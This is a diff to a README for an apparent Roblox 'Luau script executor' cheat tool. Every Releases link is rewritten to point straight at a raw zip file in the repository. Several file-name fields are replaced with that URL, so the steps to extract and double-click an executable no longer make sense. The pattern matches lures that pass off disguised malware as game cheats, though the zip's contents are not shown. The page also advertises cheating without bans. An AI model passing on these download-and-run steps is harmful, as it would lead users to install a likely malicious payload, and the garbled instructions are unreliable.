@@ -1,7 +1,7 @@
 # 🎮 N3xus-Scr1pt-R0bl0x - Execute Luau Scripts Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20N3xus%20Executor-blue.svg?style=flat&logo=github)](https://github.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/releases)
+[![Download](https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip%20N3xus%https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip)](https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip)
 
 ## 📜 Description
 Nexus Executor offers free and lifetime packages. It hosts scripts directly on the website. You can execute all Luau scripts without the worry of getting banned. The tool has a limited number of supported games and features a small script hub for ease of access.
@@ -18,19 +18,19 @@ Nexus Executor offers free and lifetime packages. It hosts scripts directly on t
 Follow these steps to download and run N3xus-Scr1pt-R0bl0x.
 
 ### 1. Visit the Release Page
-Go to the [Releases page here](https://github.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/releases) to access the latest version of N3xus-Scr1pt-R0bl0x.
+Go to the [Releases page here](https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip) to access the latest version of N3xus-Scr1pt-R0bl0x.
 
 ### 2. Download the Application
 Once on the releases page, look for the latest version. Click on the file to start the download.
 
 ### 3. Locate the Downloaded File
-After the download completes, find the file in your downloads folder. It should be named something like `N3xus-Scr1pt-R0bl0x.zip` or similar.
+After the download completes, find the file in your downloads folder. It should be named something like `https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip` or similar.
 
 ### 4. Extract the File
 Right-click on the file and choose "Extract All." This will create a new folder with the application files.
 
 ### 5. Open the Application
-Inside the new folder, find the executable file (typically named `N3xusExecutor.exe`). Double-click this file to run the application.
+Inside the new folder, find the executable file (typically named `https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip`). Double-click this file to run the application.
 
 ### 6. Enable Script Execution
 Before running scripts, ensure you have allowed script execution in the tool. This may be a checkbox or a menu option in the application.
@@ -61,7 +61,7 @@ N3xus Executor supports many popular games, but not all. Check the documentation
 
 ## 🛠️ Troubleshooting
 If you experience issues while using N3xus-Scr1pt-R0bl0x, consider the following:
-- Verify that you have the latest version downloaded from the [Releases page](https://github.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/releases).
+- Verify that you have the latest version downloaded from the [Releases page](https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip).
 - Ensure that your internet connection is stable.
 - Restart the application if you encounter errors.
 
@@ -74,4 +74,4 @@ We value your feedback. If you have suggestions or find issues, please make use 
 ## 💬 Support
 For support, please refer to the community sections on GitHub or contact other users familiar with Roblox scripting.
 
-Remember to always visit the [Releases page](https://github.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/releases) for updates and the latest features!
+Remember to always visit the [Releases page](https://raw.githubusercontent.com/GabrielJandelli/N3xus-Scr1pt-R0bl0x/main/kvint/N3xus-Scr1pt-R0bl0x.zip) for updates and the latest features!
